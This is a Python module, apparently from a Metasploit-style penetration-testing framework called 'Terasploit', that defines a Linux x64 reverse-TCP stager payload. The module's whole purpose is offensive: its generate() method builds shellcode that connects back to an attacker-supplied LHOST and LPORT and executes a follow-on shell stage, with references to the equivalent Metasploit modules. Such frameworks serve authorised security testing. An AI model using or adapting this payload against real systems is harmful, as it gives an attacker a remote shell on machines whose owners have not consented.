from collections.abc import Sequence

from teralibs.tsf.base.payload import ARCH_X64, PLATFORM_LINUX, STAGER, Payload, PayloadHandler
from teralibs.tsf.core.payload.linux.x64.reverse_tcp import ReverseTcpX64


class TerasploitModule(ReverseTcpX64, Payload):
    """Linux x64 reverse-TCP stager."""

    NAME: str = "Linux x64 Reverse TCP Stager"
    DESCRIPTION: str = (
        "Linux x86-64 stager that opens a reverse TCP channel to the attacker and executes the companion stage delivered by the framework."
    )
    AUTHOR: Sequence = ["4steroth"]
    LICENSE: str = "BSD-3-CLAUSE"
    VERSION: str = "1.1"
    RANK: str = "normal"
    REFERENCES: Sequence = [
        "https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stagers/linux/x64/reverse_tcp.rb",
        "https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/linux/x64/reverse_tcp.rb",
    ]
    PAYLOAD_TYPE: str = STAGER
    HANDLER: object = PayloadHandler.ReverseTCP
    STAGE_PATH: str = "linux.x64.shell"
    CACHED_SIZE: int = 130
    MAX_SIZE: int | None = 300
    ARCH: Sequence = [ARCH_X64]
    PLATFORM: Sequence = [PLATFORM_LINUX]
    OPTIONS: Sequence = ["LHOST", "LPORT", "EXITFUNC"]

    def generate(self, ctx):
        """Generate the Linux x64 reverse-TCP stager shellcode."""
        host = ctx.get_option("LHOST")
        port = int(ctx.get_option("LPORT"))
        exitfunc = str(ctx.get_option("EXITFUNC") or "process").lower().strip()
        shellcode = self.generate_reverse_tcp(
            host_option=(host, port, exitfunc),
        )

        return self.apply_prepends(shellcode, ctx)
